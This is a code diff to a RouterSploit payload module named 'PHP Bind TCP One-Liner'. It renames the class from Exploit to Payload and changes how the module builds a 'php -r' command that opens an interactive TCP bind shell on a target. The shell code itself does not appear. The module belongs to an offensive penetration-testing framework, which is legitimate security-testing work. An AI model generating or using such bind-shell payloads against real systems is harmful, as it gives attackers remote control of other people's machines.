@@ -1,8 +1,8 @@
 from routersploit.core.exploit import *
-from routersploit.modules.payloads.php.bind_tcp import Exploit as PHPBindTCP
+from routersploit.modules.payloads.php.bind_tcp import Payload as PHPBindTCP
 
 
-class Exploit(PHPBindTCP):
+class Payload(PHPBindTCP):
     __info__ = {
         "name": "PHP Bind TCP One-Liner",
         "description": "Creates interactive tcp bind shell by using php one-liner.",
@@ -14,7 +14,6 @@ class Exploit(PHPBindTCP):
     cmd = OptString("php", "PHP binary")
 
     def generate(self):
-        payload = super(Exploit, self).generate()
-
-        cmd = '{} -r "{}"'.format(self.cmd, payload)
-        return cmd
+        self.fmt = self.cmd + ' -r "{}"'
+        payload = super(Payload, self).generate()
+        return payload
